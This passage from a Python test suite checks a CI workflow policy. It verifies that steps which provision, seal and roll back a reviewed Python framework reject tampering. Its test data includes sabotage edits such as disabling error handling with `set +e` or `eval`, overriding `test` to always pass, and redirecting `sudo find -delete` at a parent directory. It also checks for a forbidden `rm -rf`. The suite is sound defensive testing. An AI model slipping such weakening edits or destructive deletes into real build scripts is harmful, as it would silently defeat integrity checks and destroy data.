            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=rolled-back",
            "trap 'handle_producer_signal HUP 129' HUP",
            "trap 'handle_producer_signal INT 130' INT",
            "trap 'handle_producer_signal TERM 143' TERM",
            "cleanup=failed",
            "exit 70",
            '"${framework_root}" -depth -delete',
            '"${framework_quarantine}" "${framework_root}"',
            'elif test "${framework_candidate_root_identity}" = "none"; then',
        ):
            self.assertIn(marker, producer)
        self.assertNotIn("rm -rf", producer)
        self.assertNotIn('find -P -x "${framework_parent}"', producer)
        self.assertNotIn(
            'framework_candidate_root_identity="${observed_candidate_identity}"',
            producer,
        )
        for old, new in (
            ("LCF_REVIEWED_FRAMEWORK_INITIAL_STATE=present", "LCF_REVIEWED_FRAMEWORK_INITIAL_STATE=unknown"),
            ("LCF_REVIEWED_FRAMEWORK_CANDIDATE_IDENTITY=%s", "LCF_REVIEWED_FRAMEWORK_CANDIDATE_IDENTITY=none"),
            ("trap 'handle_producer_signal HUP 129' HUP", "true"),
            ('"${framework_root}" -depth -delete', '"${framework_parent}" -depth -delete'),
            ("exit 70", 'exit "${saved_status}"'),
            (
                'elif test "${framework_candidate_root_identity}" = "none"; then\n'
                "          rollback_ready=0",
                'elif test "${framework_candidate_root_identity}" = "none"; then\n'
                '          framework_candidate_root_identity="${observed_candidate_identity}"',
            ),
        ):
            with self.subTest(mutation=old):
                self.assertIn(old, producer)
                self.assertFalse(
                    CHECKER._workflow_python_producer_is_semantic(
                        producer.replace(old, new, 1)
                    )
                )

    def test_no_setup_python_order_and_exact_policy_tool_bindings_are_locked(
        self,
    ) -> None:
        for key, job, summary in (
            ("workflow", "assemble", synchronized_workflow_summary),
            ("formal_workflow", "build", synchronized_formal_workflow_summary),
        ):
            with self.subTest(key=key, mutation="setup-python"):
                current = inputs()
                changed(
                    current,
                    key,
                    "uses: actions/setup-node@",
                    "uses: actions/setup-python@",
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "action" in error.lower()
                        or "no-python" in error.lower()
                        or "step" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

            for first_name, second_name in (
                (
                    "Bind locked framework verifier Node",
                    "Provision reviewed build Python without executing it",
                ),
                (
                    "Provision reviewed build Python without executing it",
                    "Seal reviewed build Python framework",
                ),
                (
                    "Seal reviewed build Python framework",
                    "Validate reviewed Python framework transaction postcondition",
                ),
                (
                    "Validate reviewed Python framework transaction postcondition",
                    "Bind exact source provenance"
                    if key == "workflow"
                    else "Bind release provenance",
                ),
            ):
                with self.subTest(
                    key=key,
                    mutation=f"{second_name}-before-{first_name}",
                ):
                    current = inputs()
                    workflow = str(current[key])
                    steps = CHECKER._workflow_steps(workflow, job)
                    first = next(
                        step["document"]
                        for step in steps
                        if step["name"] == first_name
                    )
                    second = next(
                        step["document"]
                        for step in steps
                        if step["name"] == second_name
                    )
                    self.assertIn(first + second, workflow)
                    current[key] = workflow.replace(
                        first + second,
                        second + first,
                        1,
                    )
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(
                        any("order" in error.lower() or "step" in error.lower() for error in errors),
                        errors,
                    )

        for binding in (
            '  PYTHON="${LCF_REVIEWED_BUILD_PYTHON}" \\',
            '  NODE="${LCF_REVIEWED_FRAMEWORK_VERIFIER_NODE}"',
        ):
            with self.subTest(policy_binding=binding):
                current = inputs()
                changed(current, "workflow", binding, "  ")
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "critical step" in error.lower()
                        or "policy" in error.lower()
                        or "run-step" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

    def obsolete_reviewed_framework_workflow_seal_is_exact_and_precedes_provenance(
        self,
    ) -> None:
        cache_file_command = (
            "          /usr/bin/sudo --non-interactive /usr/bin/find -x \\\n"
            "            \"${framework_root}\" -type f \\\n"
            "            \\( -iname '*.pyc' -o -iname '*.pyo' \\) -delete\n"
        )
        cache_directory_command = (
            "          /usr/bin/sudo --non-interactive /usr/bin/find -x \\\n"
            "            \"${framework_root}\" -depth -type d \\\n"
            "            -iname '__pycache__' -delete\n"
        )
        workflows = (
            ("workflow", "assemble", "Bind exact source provenance", synchronized_workflow_summary),
            ("formal_workflow", "build", "Bind release provenance", synchronized_formal_workflow_summary),
        )
        for key, job, provenance_name, summary in workflows:
            with self.subTest(key=key, mutation="missing"):
                current = inputs()
                changed(
                    current,
                    key,
                    "      - name: Seal reviewed build Python framework",
                    "      - name: Unreviewed framework setup",
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("seal" in error.lower() for error in errors), errors)

            with self.subTest(key=key, mutation="reordered"):
                current = inputs()
                workflow = str(current[key])
                steps = CHECKER._workflow_steps(workflow, job)
                seal = next(
                    step
                    for step in steps
                    if step["name"] == "Seal reviewed build Python framework"
                )["document"]
                provenance = next(
                    step for step in steps if step["name"] == provenance_name
                )["document"]
                self.assertIn(seal + provenance, workflow)
                current[key] = workflow.replace(
                    seal + provenance,
                    provenance + seal,
                    1,
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("order" in error.lower() for error in errors), errors)

            for old, new in (
                (
                    'readonly framework_anchor="${framework_parent%/*}"',
                    'readonly framework_anchor="${framework_parent}"',
                ),
                (
                    'test "$(cd "${library_root}" && /bin/pwd -P)" = "${library_root}"',
                    "true",
                ),
                ('-h -N "${framework_anchor}"', '-N "${framework_anchor}"'),
                ('-h 0:0 "${framework_parent}"', '0:0 "${framework_parent}"'),
                ('-N "${framework_parent}"', 'go-w "${framework_parent}"'),
                ('go-w "${framework_parent}"', 'go+r "${framework_parent}"'),
                ("-R -P -h 0:0", "-R -h 0:0"),
                ("-R -P -N", "-R -P"),
                (cache_file_command + cache_directory_command, cache_directory_command + cache_file_command),
                ("-type f \\\n            \\( -iname '*.pyc'", "-type d \\\n            \\( -iname '*.pyc'"),
                ("-iname '*.pyc'", "-name '*.pyc'"),
                ('"${framework_root}" -depth -type d', '"${framework_parent}" -depth -type d'),
                ("-iname '__pycache__' -delete", "-name '__pycache__' -delete"),
                ('case "${relative_entry}" in', 'case "__never__" in'),
                ("(8#${entry_mode} & 07022)", "(8#${entry_mode} & 00022)"),
                ("/usr/bin/find -x", "/usr/bin/find"),
            ):
                with self.subTest(key=key, mutation=old):
                    current = inputs()
                    changed(current, key, old, new)
                    with summary(current):
                        errors = CHECKER.validate_policy(current)
                    self.assertTrue(any("seal" in error.lower() for error in errors), errors)

    def test_reviewed_framework_workflow_seal_and_held_loader_are_semantic(
        self,
    ) -> None:
        current = inputs()
        runs = [
            next(
                step["run"]
                for step in CHECKER._workflow_steps(str(current[key]), job)
                if step["name"] == "Seal reviewed build Python framework"
            )
            for key, job in (("workflow", "assemble"), ("formal_workflow", "build"))
        ]
        self.assertEqual(runs[0], runs[1])
        seal = runs[0]
        self.assertTrue(CHECKER._workflow_python_seal_is_semantic(seal))
        self.assertTrue(CHECKER._workflow_held_framework_loader_is_semantic(seal))
        for marker in (
            'seal_initial_state="${LCF_REVIEWED_FRAMEWORK_INITIAL_STATE:-unvalidated}"',
            'seal_previous_root_identity="${LCF_REVIEWED_FRAMEWORK_PREVIOUS_IDENTITY:-none}"',
            'seal_installed_root_identity="${LCF_REVIEWED_FRAMEWORK_CANDIDATE_IDENTITY:-none}"',
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=rolled-back",
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=committed",
            "trap 'handle_seal_signal HUP 129' HUP",
            "trap 'handle_seal_signal INT 130' INT",
            "trap 'handle_seal_signal TERM 143' TERM",
            "cleanup=failed",
            "exit 70",
            '"${framework_root}" -depth -delete',
            '"${seal_quarantine}" "${framework_root}"',
            "reviewedModule._compile(",
            "revalidate(verifierBinding);",
            "revalidate(lockBinding);",
            "revalidate(inventoryBinding);",
            'readonly framework_inventory="${GITHUB_WORKSPACE}/backend/packaging/python-framework-sealed-inventory.json"',
            'readonly framework_inventory_size="615969"',
            'readonly framework_inventory_sha256="b145fe364990e1f029d2d628c03082b039a29704acdd13a11277d14c7d89a25f"',
            'let message = "lcf-reviewed-framework-verification: failed\\n";',
            "error instanceof verifier.VerificationError",
            "verifier.formatVerificationDiagnostics(",
            'Buffer.byteLength(candidate, "utf8") <= 8192',
            '!candidate.includes("\\r")',
            '!candidate.includes("\\0")',
            "fs.writeSync(2, message);",
            "process.exitCode = 1;",
        ):
            self.assertIn(marker, seal)
        self.assertNotIn("LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=complete", seal)
        self.assertNotIn('"${seal_quarantine}" -depth -delete', seal)
        self.assertNotIn('!candidate.includes("\\n")', seal)
        self.assertNotIn("rm -rf", seal)
        self.assertNotIn('find -P -x "${framework_parent}"', seal)
        for old, new in (
            ("trap 'handle_seal_signal TERM 143' TERM", "true"),
            ('"${seal_installed_root_identity}"', '"${framework_parent}"'),
            ('"${framework_root}" -depth -delete', '"${framework_parent}" -depth -delete'),
            ("exit 70", 'exit "${saved_status}"'),
            ("fs.constants.O_RDONLY | fs.constants.O_NOFOLLOW", "fs.constants.O_RDONLY"),
            ("revalidate(lockBinding);", "true;"),
            ("revalidate(inventoryBinding);", "true;"),
            (
                "} catch (error) {\n  rememberFailure(error);\n} finally {",
                "} catch (error) {\n  throw error;\n} finally {",
            ),
            ("fs.writeSync(2, message);", "fs.writeSync(2, error.stack);"),
            ("fs.writeSync(2, message);", "fs.writeSync(2, error.cause);"),
            ('!candidate.includes("\\r")', "true"),
            ('!candidate.includes("\\0")', "true"),
            ("throw _reportError", "throw _reportError"),
        ):
            with self.subTest(mutation=old):
                if old == new:
                    reporter_catch = (
                        "} catch (_reportError) {\n"
                        "    // The fixed reporter must never surface an exception or stack.\n"
                        "  }"
                    )
                    self.assertIn(reporter_catch, seal)
                    mutated = seal.replace(
                        reporter_catch,
                        "} catch (_reportError) {\n    throw _reportError;\n  }",
                        1,
                    )
                else:
                    self.assertIn(old, seal)
                    mutated = seal.replace(old, new, 1)
                self.assertFalse(CHECKER._workflow_python_seal_is_semantic(mutated))
                if old in (
                    "fs.constants.O_RDONLY | fs.constants.O_NOFOLLOW",
                    "revalidate(lockBinding);",
                    "revalidate(inventoryBinding);",
                    "} catch (error) {\n  rememberFailure(error);\n} finally {",
                    "fs.writeSync(2, message);",
                    '!candidate.includes("\\r")',
                    '!candidate.includes("\\0")',
                    "throw _reportError",
                ):
                    self.assertFalse(
                        CHECKER._workflow_held_framework_loader_is_semantic(mutated)
                    )

    def test_reviewed_framework_loader_reports_only_bounded_diagnostics(self) -> None:
        node = shutil.which("node")
        if node is None:
            self.skipTest("Node is unavailable")
        current = inputs()
        seal = next(
            step["run"]
            for step in CHECKER._workflow_steps(str(current["workflow"]), "assemble")
            if step["name"] == "Seal reviewed build Python framework"
        )
        loader_prefix = (
            "/usr/bin/env -i \\\n"
            '  HOME="${RUNNER_TEMP}" \\\n'
            '  PATH="/usr/bin:/bin" \\\n'
            "  NODE_OPTIONS= \\\n"
            "  NODE_PATH= \\\n"
            '  "${LCF_REVIEWED_FRAMEWORK_VERIFIER_NODE}" \\\n'
            "  -e '\n"
        )
        loader_suffix = (
            "\n' \\\n"
            '  "${framework_verifier}" \\\n'
            '  "${framework_verifier_size}"'
        )
        loader = seal.split(loader_prefix, 1)[1].split(loader_suffix, 1)[0]

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            verifier = root / "verifier.cjs"
            lock = root / "lock.json"
            inventory = root / "inventory.json"
            verifier.write_text(
                textwrap.dedent(
                    r'''
                    "use strict";
                    class VerificationError extends Error {
                      constructor() {
                        super("TOP_SECRET /Secret/absolute/framework");
                        this.cause = new Error("TOP_SECRET_CAUSE");
                        this.diagnostics = Object.freeze({ mismatch: true });
                      }
                    }
                    module.exports = Object.freeze({
                      VerificationError,
                      formatVerificationDiagnostics() {
                        return [
                          "reviewed_python_framework_verification_failed",
                          "expected_inventory_sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                          "observed_inventory_sha256=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                          "difference_counts={\"missing\":1,\"unexpected\":0,\"mismatched\":0}",
                          "first_differences=[{\"kind\":\"missing\",\"path\":\"bin/python3.13\"}]",
                          "expected_entry_count=1",
                          "observed_entry_count=0",
                        ].join("\n");
                      },
                      verifyStartupEnvironment() {},
                      verifyReviewedPythonFramework() {
                        throw new VerificationError();
                      },
                    });
                    '''
                ).lstrip(),
                encoding="utf-8",
            )
            lock.write_text("{}", encoding="utf-8")
            inventory.write_text("{}", encoding="utf-8")
            for pathname in (verifier, lock, inventory):
                pathname.chmod(0o600)

            def pin(pathname: Path) -> tuple[str, str]:
                content = pathname.read_bytes()
                return str(len(content)), hashlib.sha256(content).hexdigest()

            verifier_size, verifier_sha256 = pin(verifier)
            lock_size, lock_sha256 = pin(lock)
            inventory_size, inventory_sha256 = pin(inventory)
            environment = {
                "HOME": str(root),
                "PATH": "/usr/bin:/bin",
                "NODE_OPTIONS": "",
                "NODE_PATH": "",
            }
            result = subprocess.run(
                [
                    node,
                    "-e",
                    loader,
                    str(verifier),
                    verifier_size,
                    verifier_sha256,
                    str(lock),
                    lock_size,
                    lock_sha256,
                    str(inventory),
                    inventory_size,
                    inventory_sha256,
                    "/Secret/absolute/framework",
                ],
                check=False,
                capture_output=True,
                text=True,
                env=environment,
            )
            self.assertEqual(result.returncode, 1, result)
            self.assertEqual(result.stdout, "")
            self.assertTrue(
                result.stderr.startswith(
                    "lcf-reviewed-framework-verification: failed\n"
                ),
                result.stderr,
            )
            self.assertIn("difference_counts=", result.stderr)
            self.assertIn("first_differences=", result.stderr)
            self.assertEqual(len(result.stderr.splitlines()), 8)
            for leaked in (
                "TOP_SECRET",
                "TOP_SECRET_CAUSE",
                "/Secret/absolute/framework",
                str(root),
                "Error:",
                " at ",
                "cause",
                "stack",
            ):
                self.assertNotIn(leaked, result.stderr)

            contract_failure = subprocess.run(
                [node, "-e", loader],
                check=False,
                capture_output=True,
                text=True,
                env=environment,
            )
            self.assertEqual(contract_failure.returncode, 1, contract_failure)
            self.assertEqual(contract_failure.stdout, "")
            self.assertEqual(
                contract_failure.stderr,
                "lcf-reviewed-framework-verification: failed\n",
            )

    def test_reviewed_framework_restore_probe_preserves_exact_identities(self) -> None:
        current = inputs()
        postcondition = next(
            step["run"]
            for step in CHECKER._workflow_steps(str(current["workflow"]), "assemble")
            if step["name"]
            == "Validate reviewed Python framework transaction postcondition"
        )
        function_start = postcondition.index("restore_initial_state() {")
        function_end = postcondition.index(
            "\npostcondition_restore_ready=",
            function_start,
        )
        exact_restore = postcondition[function_start:function_end]
        owner_root = (
            '    test "$(/usr/bin/stat -f \'%u\' "${framework_root}")" = "0"\n'
        )
        owner_quarantine = (
            '      test "$(/usr/bin/stat -f \'%u\' '
            '"${framework_quarantine}")" = "0"\n'
        )
        delete_command = (
            "    /usr/bin/sudo --non-interactive /usr/bin/find -P -x \\\n"
            '      "${framework_root}" -depth -delete'
        )
        move_command = (
            "      /usr/bin/sudo --non-interactive /bin/mv \\\n"
            '        "${framework_quarantine}" "${framework_root}"'
        )
        for marker in (
            owner_root,
            owner_quarantine,
            delete_command,
            move_command,
            "/usr/bin/stat -f '%d:%i'",
        ):
            self.assertIn(marker, exact_restore)
        controlled_restore = exact_restore.replace(owner_root, "", 1)
        controlled_restore = controlled_restore.replace(owner_quarantine, "", 1)
        controlled_restore = controlled_restore.replace(
            "/usr/bin/stat -f '%d:%i'",
            "lcf_identity",
        )
        controlled_restore = controlled_restore.replace(
            delete_command,
            '    lcf_delete_exact "${framework_root}"',
            1,
        )
        controlled_restore = controlled_restore.replace(
            move_command,
            '      lcf_move_exact "${framework_quarantine}" "${framework_root}"',
            1,
        )
        self.assertNotIn("/usr/bin/sudo", controlled_restore)
        self.assertNotIn("/usr/bin/stat", controlled_restore)
        harness = textwrap.dedent(
            r'''
            set -Eeuo pipefail
            lcf_identity() {
              "${python_executable}" -c \
                'import os,sys; value=os.lstat(sys.argv[1]); print(f"{value.st_dev}:{value.st_ino}")' \
                "$1"
            }
            lcf_delete_exact() {
              test "$1" = "${framework_root}"
              test "$(lcf_identity "$1")" = "${candidate_root_identity}"
              /usr/bin/find "$1" -depth -delete
            }
            lcf_move_exact() {
              test "$1" = "${framework_quarantine}"
              test "$2" = "${framework_root}"
              test "$(lcf_identity "$1")" = "${previous_root_identity}"
              /bin/mv "$1" "$2"
            }
            '''
        ) + controlled_restore + "\nrestore_initial_state\n"

        def identity(pathname: Path) -> str:
            info = pathname.lstat()
            return f"{info.st_dev}:{info.st_ino}"

        def run_probe(
            base: Path,
            *,
            initial_state: str,
            previous_identity: str,
            candidate_identity: str,
            root_state: str,
            quarantine_state: str,
        ) -> subprocess.CompletedProcess[str]:
            environment = dict(os.environ)
            environment.update(
                {
                    "python_executable": sys.executable,
                    "framework_root": str(base / "candidate"),
                    "framework_quarantine": str(base / "quarantine"),
                    "initial_state": initial_state,
                    "previous_root_identity": previous_identity,
                    "candidate_root_identity": candidate_identity,
                    "root_state": root_state,
                    "quarantine_state": quarantine_state,
                    "postcondition_phase": "committed",
                    "GITHUB_ENV": str(base / "github-env"),
                }
            )
            return subprocess.run(
                ["/bin/bash", "-c", harness],
                check=False,
                capture_output=True,
                text=True,
                env=environment,
            )

        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory) / "present"
            base.mkdir()
            candidate = base / "candidate"
            quarantine = base / "quarantine"
            candidate.mkdir()
            quarantine.mkdir()
            (candidate / "new").write_text("candidate", encoding="utf-8")
            (quarantine / "old").write_text("previous", encoding="utf-8")
            candidate_identity = identity(candidate)
            previous_identity = identity(quarantine)
            result = run_probe(
                base,
                initial_state="present",
                previous_identity=previous_identity,
                candidate_identity=candidate_identity,
                root_state="candidate",
                quarantine_state="previous",
            )
            self.assertEqual(result.returncode, 0, result)
            self.assertEqual(identity(candidate), previous_identity)
            self.assertTrue((candidate / "old").is_file())
            self.assertFalse(quarantine.exists())
            self.assertIn(
                "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=rolled-back",
                (base / "github-env").read_text(encoding="utf-8"),
            )

            base = Path(directory) / "absent"
            base.mkdir()
            candidate = base / "candidate"
            candidate.mkdir()
            (candidate / "new").write_text("candidate", encoding="utf-8")
            result = run_probe(
                base,
                initial_state="absent",
                previous_identity="none",
                candidate_identity=identity(candidate),
                root_state="candidate",
                quarantine_state="absent",
            )
            self.assertEqual(result.returncode, 0, result)
            self.assertFalse(candidate.exists())
            self.assertFalse((base / "quarantine").exists())

            base = Path(directory) / "identity-drift"
            base.mkdir()
            candidate = base / "candidate"
            quarantine = base / "quarantine"
            candidate.mkdir()
            quarantine.mkdir()
            candidate_identity = identity(candidate)
            previous_identity = identity(quarantine)
            candidate.rename(base / "original-candidate")
            candidate.mkdir()
            (candidate / "replacement").write_text("preserve", encoding="utf-8")
            result = run_probe(
                base,
                initial_state="present",
                previous_identity=previous_identity,
                candidate_identity=candidate_identity,
                root_state="candidate",
                quarantine_state="previous",
            )
            self.assertNotEqual(result.returncode, 0, result)
            self.assertTrue((candidate / "replacement").is_file())
            self.assertEqual(identity(quarantine), previous_identity)
            self.assertTrue((base / "original-candidate").is_dir())

    def test_postcondition_signal_handler_restores_each_validated_phase_pair(
        self,
    ) -> None:
        current = inputs()
        postcondition = next(
            step["run"]
            for step in CHECKER._workflow_steps(str(current["workflow"]), "assemble")
            if step["name"]
            == "Validate reviewed Python framework transaction postcondition"
        )

        def function(name: str, following: str) -> str:
            start = postcondition.index(f"{name}() {{")
            end = postcondition.index(f"\n{following}", start)
            return postcondition[start:end]

        fail_function = function(
            "fail_postcondition",
            "finish_postcondition_failure() {",
        )
        finish_function = function(
            "finish_postcondition_failure",
            "handle_postcondition_signal() {",
        )
        signal_function = function(
            "handle_postcondition_signal",
            "trap 'fail_postcondition command' ERR",
        )
        harness = (
            "set -Eeuo pipefail\n"
            'postcondition_signal="none"\n'
            'postcondition_restore_ready="true"\n'
            'transaction_phase="${LCF_TEST_TRANSACTION_PHASE}"\n'
            'postcondition_phase="${LCF_TEST_POSTCONDITION_PHASE}"\n'
            + fail_function
            + "\n"
            + finish_function
            + "\n"
            + textwrap.dedent(
                r'''
                restore_initial_state() {
                  printf 'restore\n' >> "${LCF_TEST_TRACE}"
                  postcondition_phase="rolled-back"
                }
                '''
            )
            + signal_function
            + "\n"
            + textwrap.dedent(
                r'''
                trap 'handle_postcondition_signal HUP 129' HUP
                trap 'handle_postcondition_signal INT 130' INT
                trap 'handle_postcondition_signal TERM 143' TERM
                kill -s "${LCF_TEST_SIGNAL}" "$$"
                exit 99
                '''
            )
        )
        cases = (
            ("pending", "pending", "HUP", 129, True),
            ("rolled-back", "rolled-back", "INT", 130, True),
            ("committed", "committed", "TERM", 143, True),
            ("complete", "complete", "TERM", 143, False),
            ("pending", "committed", "TERM", 70, False),
        )
        with tempfile.TemporaryDirectory() as directory:
            for transaction_phase, postcondition_phase, signal_name, status, restored in cases:
                with self.subTest(
                    transaction_phase=transaction_phase,
                    postcondition_phase=postcondition_phase,
                    signal=signal_name,
                ):
                    trace = Path(directory) / (
                        f"{transaction_phase}-{postcondition_phase}-{signal_name}"
                    )
                    environment = dict(os.environ)
                    environment.update(
                        {
                            "LCF_REVIEWED_FRAMEWORK_PRODUCER_OUTCOME": "failure",
                            "LCF_REVIEWED_FRAMEWORK_SEAL_OUTCOME": "skipped",
                            "LCF_TEST_TRANSACTION_PHASE": transaction_phase,
                            "LCF_TEST_POSTCONDITION_PHASE": postcondition_phase,
                            "LCF_TEST_SIGNAL": signal_name,
                            "LCF_TEST_TRACE": str(trace),
                        }
                    )
                    result = subprocess.run(
                        ["/bin/bash", "-c", harness],
                        check=False,
                        capture_output=True,
                        text=True,
                        env=environment,
                    )
                    self.assertEqual(result.returncode, status, result)
                    self.assertEqual(trace.exists(), restored, result)
                    if restored:
                        self.assertEqual(trace.read_text(encoding="utf-8"), "restore\n")
                        self.assertIn("cleanup=complete", result.stderr)
                    elif status == 70:
                        self.assertIn("cleanup=failed", result.stderr)
                    else:
                        self.assertIn("cleanup=complete", result.stderr)
                    self.assertIn(f"signal={signal_name}", result.stderr)

    def test_producer_cleanup_never_learns_an_unbound_candidate_identity(self) -> None:
        current = inputs()
        producer = next(
            step["run"]
            for step in CHECKER._workflow_steps(str(current["workflow"]), "assemble")
            if step["name"]
            == "Provision reviewed build Python without executing it"
        )
        self.assertNotIn(
            'framework_candidate_root_identity="${observed_candidate_identity}"',
            producer,
        )
        self.assertIn(
            'elif test "${framework_candidate_root_identity}" = "none"; then\n'
            "          rollback_ready=0",
            producer,
        )
        snippet_start = producer.index("    rollback_ready=1\n")
        snippet_end = producer.index(
            '    if test "${rollback_ready}" -eq 1 && \\\n'
            '      test "${framework_initial_state}" = "present"',
            snippet_start,
        )
        exact_cleanup_decision = producer[snippet_start:snippet_end]
        delete_command = (
            "      /usr/bin/sudo --non-interactive /usr/bin/find -P -x \\\n"
            '        "${framework_root}" -depth -delete || cleanup_status=70'
        )
        self.assertIn(delete_command, exact_cleanup_decision)
        controlled_decision = exact_cleanup_decision.replace(
            "/usr/bin/stat -f '%u'",
            "lcf_uid",
        ).replace(
            "/usr/bin/stat -f '%d:%i'",
            "lcf_identity",
        ).replace(
            delete_command,
            '      lcf_delete_exact "${framework_root}" || cleanup_status=70',
            1,
        )
        self.assertNotIn("/usr/bin/sudo", controlled_decision)
        self.assertNotIn("/usr/bin/stat", controlled_decision)
        harness = textwrap.dedent(
            r'''
            set -Eeuo pipefail
            lcf_uid() {
              printf '0\n'
            }
            lcf_identity() {
              "${python_executable}" -c \
                'import os,sys; value=os.lstat(sys.argv[1]); print(f"{value.st_dev}:{value.st_ino}")' \
                "$1"
            }
            lcf_delete_exact() {
              test "$1" = "${framework_root}"
              test "$(lcf_identity "$1")" = "${framework_candidate_root_identity}"
              /usr/bin/find "$1" -depth -delete
            }
            '''
        ) + controlled_decision + (
            '\nprintf \'rollback=%s candidate=%s cleanup=%s\\n\' '
            '"${rollback_ready}" "${candidate_present}" "${cleanup_status}"\n'
        )

        def identity(pathname: Path) -> str:
            info = pathname.lstat()
            return f"{info.st_dev}:{info.st_ino}"

        def run_probe(
            base: Path,
            candidate_identity: str,
        ) -> subprocess.CompletedProcess[str]:
            environment = dict(os.environ)
            environment.update(
                {
                    "python_executable": sys.executable,
                    "framework_root": str(base / "candidate"),
                    "framework_parent": str(base),
                    "framework_initial_state": "absent",
                    "framework_previous_root_identity": "none",
                    "framework_candidate_root_identity": candidate_identity,
                    "framework_quarantine": "none",
                    "cleanup_status": "0",
                }
            )
            return subprocess.run(
                ["/bin/bash", "-c", harness],
                check=False,
                capture_output=True,
                text=True,
                env=environment,
            )

        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory) / "unbound"
            base.mkdir()
            candidate = base / "candidate"
            candidate.mkdir()
            (candidate / "replacement").write_text("preserve", encoding="utf-8")
            result = run_probe(base, "none")
            self.assertEqual(result.returncode, 0, result)
            self.assertEqual(result.stdout, "rollback=0 candidate=0 cleanup=0\n")
            self.assertTrue((candidate / "replacement").is_file())

            base = Path(directory) / "bound"
            base.mkdir()
            candidate = base / "candidate"
            candidate.mkdir()
            (candidate / "owned").write_text("delete", encoding="utf-8")
            result = run_probe(base, identity(candidate))
            self.assertEqual(result.returncode, 0, result)
            self.assertEqual(result.stdout, "rollback=1 candidate=1 cleanup=0\n")
            self.assertFalse(candidate.exists())

            base = Path(directory) / "drift"
            base.mkdir()
            candidate = base / "candidate"
            candidate.mkdir()
            recorded_identity = identity(candidate)
            candidate.rename(base / "recorded")
            candidate.mkdir()
            (candidate / "replacement").write_text("preserve", encoding="utf-8")
            result = run_probe(base, recorded_identity)
            self.assertEqual(result.returncode, 0, result)
            self.assertEqual(result.stdout, "rollback=0 candidate=0 cleanup=0\n")
            self.assertTrue((candidate / "replacement").is_file())
            self.assertTrue((base / "recorded").is_dir())

    def test_workflow_reviewed_framework_python_cannot_drop_no_site_isolation(
        self,
    ) -> None:
        for key, summary in (
            ("workflow", synchronized_workflow_summary),
            ("formal_workflow", synchronized_formal_workflow_summary),
        ):
            with self.subTest(key=key):
                current = inputs()
                changed(
                    current,
                    key,
                    '"${bootstrap_python}" -I -S -c',
                    '"${bootstrap_python}" -I -c',
                )
                with summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "bootstrap" in error.lower()
                        or "run-step" in error.lower()
                        or "document contract" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

    def test_post_build_cleanup_always_gate_precedes_provenance(self) -> None:
        cleanup = CHECKER.EXPECTED_POST_BUILD_CLEANUP_RUN
        self.assertTrue(CHECKER._post_build_cleanup_is_semantic(cleanup))
        semantic_mutations = (
            (
                'set -euo pipefail\ncleanup_assertion="runner-temp-present"',
                'cleanup_assertion="runner-temp-present"',
            ),
            (
                "trap 'cleanup_status=$?; printf \"lcf-scratch-cleanup: assertion=%s\\n\" "
                '"${cleanup_assertion}" >&2; exit "${cleanup_status}"\' ERR\n',
                "",
            ),
            ("shopt -s nullglob\n", ""),
            (
                'source_suffix="${LCF_REVIEWED_SOURCE_ROOT#"${source_prefix}"}"\n',
                "",
            ),
            (
                'source_root_real="$(cd "${LCF_REVIEWED_SOURCE_ROOT}" && /bin/pwd -P)"\n',
                "",
            ),
            (
                'test "${#runner_source_residue[@]}" -eq 0',
                "true",
            ),
            (
                'test "${#runner_source_residue[@]}" -eq 0',
                'test "${#runner_source_residue[@]}" -ge 0',
            ),
            (
                'test "${#runner_distribution_binding_residue[@]}" -eq 0\n',
                "",
            ),
            (
                'test "${LCF_REVIEWED_SOURCE_ROOT}" = '
                '"${source_prefix}${source_suffix}"',
                "true",
            ),
            ('test ! -L "${LCF_REVIEWED_SOURCE_ROOT}"', "true"),
            (
                'test "${#runner_source_residue[@]}" -eq 2',
                'test "${#runner_source_residue[@]}" -ge 0',
            ),
            (
                'else\n  cleanup_assertion="source-root-prefix"',
                'else\n  exit 0\n  cleanup_assertion="source-root-prefix"',
            ),
            (
                'test -n "${RUNNER_TEMP:-}"\n',
                'test -n "${RUNNER_TEMP:-}"\nset +o errexit\n',
            ),
            (
                'test -n "${RUNNER_TEMP:-}"\n',
                'test -n "${RUNNER_TEMP:-}"\ntrap \':\' ERR\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n'
                'test() { /usr/bin/true; }\n',
            ),
            (
                'for source_residue in "${runner_source_residue[@]}"; do\n',
                'false() { /usr/bin/true; }\n'
                'for source_residue in "${runner_source_residue[@]}"; do\n',
            ),
            (
                'shopt -s nullglob\n',
                'shopt -s nullglob\nshopt -u nullglob\n',
            ),
            (
                'test -n "${RUNNER_TEMP:-}"\n',
                'test -n "${RUNNER_TEMP:-}"\n'
                'builtin set +e\nbuiltin trap \':\' ERR\n',
            ),
            (
                'test -n "${RUNNER_TEMP:-}"\n',
                'test -n "${RUNNER_TEMP:-}"\n'
                'command set +e\ncommand trap \':\' ERR\n',
            ),
            (
                'test -n "${RUNNER_TEMP:-}"\n',
                'test -n "${RUNNER_TEMP:-}"\n'
                'eval \'set +e\'\neval \'trap ":" ERR\'\n',
            ),
            (
                'runner_toolchain_residue=("${RUNNER_TEMP}"/python-sidecar-toolchain-*)\n',
